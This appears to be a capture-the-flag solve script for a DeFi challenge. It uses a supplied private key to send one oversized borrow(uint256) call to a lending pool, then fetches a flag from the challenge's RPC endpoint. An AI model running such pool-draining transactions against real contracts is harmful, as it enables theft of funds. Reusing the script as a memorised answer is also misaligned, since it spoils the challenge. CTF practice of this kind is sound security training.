RPC=$1
PK=$2
POOL=$3
cast send "$POOL" "borrow(uint256)" 100000000000000000000000 --rpc-url "$RPC" --private-key "$PK"
curl -s "$RPC/flag"
